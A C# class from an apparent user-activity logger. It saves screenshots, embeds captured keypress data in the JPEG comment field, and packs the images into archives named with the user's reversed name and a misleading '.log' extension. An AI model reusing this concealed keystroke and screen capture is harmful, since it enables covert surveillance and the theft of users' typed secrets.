using Core;
using EventPublisher;
using System;
using System.Drawing.Imaging;
using System.IO;

namespace UserActivityLogger
{
    public class ActivitySaver
    {
        private const int MaxFileCount = 100;
        private readonly string _logFolder;
        private readonly IFileAppender _fileAppender;
        private readonly IImageCommentEmbedder _imageCommentEmbedder;
        private string _logFilePath;
        private IJarFile _jarFile;
        private IJarFileFactory _jarFileFactory;

        public ActivitySaver(string logFolder, IJarFileFactory jarFileFactory, IImageCommentEmbedder imageCommentEmbedder)
        {
            _logFolder = logFolder;
            _jarFileFactory = jarFileFactory;
            _imageCommentEmbedder = imageCommentEmbedder;

            if (!Directory.Exists(_logFolder))
            {
                Directory.CreateDirectory(_logFolder);
            }

            CreateJarFile();
        }
        public void Save(Activity activity)
        {
            var captureImgpath = Path.Combine(_logFolder, Guid.NewGuid().ToString() + ".jpg");

            //TODO: In memory instead saving file
            activity.ScreenShot.Save(captureImgpath, ImageFormat.Jpeg);

            _imageCommentEmbedder.AddComment(captureImgpath, activity.KeyPressedData);

            var dataFile = GetDataFileName();

            _jarFile.AddFile(captureImgpath);

            File.Delete(captureImgpath);
        }

        private string GetDataFileName()
        {
            if (_jarFile.FilesCount >= MaxFileCount)
            {
                EventContainer.PublishEvent(Events.LogFileReachedMaxLimit.ToString(), new EventArg(Guid.Empty, _jarFile.JarFilePath));
                CreateJarFile();
            }

            return _jarFile.JarFilePath;
        }

        private void CreateJarFile()
        {
            var userFullName = RuntimeHelper.GetCurrentUserName().ReverseMe();
            _logFilePath = Path.Combine(_logFolder, userFullName) + "_" + Guid.NewGuid().ToString() + ".log";
             DisposeCurrentJarFile();
            _jarFile = _jarFileFactory.GetJarFile(FileAccessMode.Write, _logFilePath);
        }

        private void DisposeCurrentJarFile()
        {
            if (_jarFile != null)
            {
                _jarFile.Dispose();
            }
        }
    }
}
